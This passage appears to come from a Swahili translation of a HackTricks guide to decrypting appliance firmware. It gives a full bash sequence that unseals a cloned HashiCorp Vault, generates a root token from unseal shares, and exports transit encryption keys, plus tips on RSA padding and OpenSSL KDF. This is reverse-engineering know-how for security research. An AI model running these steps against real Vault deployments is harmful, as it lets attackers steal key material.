- Decompile updater / management binary na fuatilia anayesoma encrypted blob, helper/API inayoiunwrap, na logical key name inayoiomba.
- Tafuta kwenye extracted root filesystem kwa KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts.
- Chukulia plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens, au local KMS auto-unseal scripts kuwa sawa na private-key material.

Ikiwa appliance inasafirisha Vault binary ya awali na storage backend, kureplay environment hiyo kwa kawaida ni rahisi kuliko kuimplement upya Vault internals:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Ukiwa na root kwenye KMS iliyoklonwa:

- Fanya transit keys ziweze ku-exportiwa ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Export unwrap key: `vault read transit/export/encryption-key/<name>`
- Jaribu RSA key iliyopatikana kwa jozi kamili ya padding/hash inayotumiwa na KMS. Decrypt iliyoshindwa ya PKCS#1 v1.5 na decrypt iliyoshindwa ya OAEP ya kawaida **hazithibitishi** kuwa key si sahihi; mtiririko mingi unaotegemea Vault hutumia OAEP yenye SHA-256, ilhali libraries za kawaida hutumia SHA-1 kwa default.
- Ikiwa payload inaanza na `Salted__`, tekeleza KDF ya vendor ya OpenSSL kwa usahihi kabisa (`EVP_BytesToKey`, mara nyingi MD5 kwenye vifaa vya zamani) kabla ya kujaribu AES-CBC decryption.

Hii hubadilisha tatizo la "encrypted firmware" kuwa tatizo la jumla zaidi: **rejesha operational keys za upande wa appliance, kisha tekeleza tena vigezo kamili vya unwrap + KDF offline**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kuvunja Firmware kwa Claude: Ujuzi wa Kiwango cha Senior, Uhuru wa Kiwango cha Junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodology ya Security Testing ya Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Udukuzi wa Vitendo wa IoT: Mwongozo Kamili wa Kushambulia Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero days kwenye hardware iliyoachwa – blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Kifaa Mahiri cha Dola 20 Kilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unaniona: Sasa Ume-Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Tesla Wall Connector kupitia kiunganishi chake cha charge port - Sehemu ya 2: kupita anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Ifanye Iblink: Exploitation ya Philips Hue Bridge kupitia Over-the-Air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
